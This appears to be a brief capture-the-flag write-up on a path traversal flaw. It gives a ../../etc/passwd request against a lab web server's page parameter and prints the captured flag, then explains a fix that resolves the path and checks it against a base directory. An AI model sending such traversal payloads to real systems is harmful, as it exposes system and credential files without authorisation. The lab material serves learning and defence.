|- let's test if it was vulnerable to path traversel attack
|- try to give hime this path ../../../../../../../../../../etc/passwd 
|- if the server resolved this path to /etc/passwd
|- that mean we can get access to all fileSystem of the server where webpage is hosted
|- http://10.11.100.30/index.php?page=../../../../../../../../../../etc/passwd 
|- a simple get request to this endpoint will give us the flag
|- Flag : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

|- input validation fo the user 
|- try always resolving the path and then check if it start with a base directory that the user has access to 
|- example static/../../../../../etc -> this resolve to /etc but doesn't start with static so  it's an invalid request 
|- exampl static/ee/../img.png valide cause after resolving the path we got /static/img.png
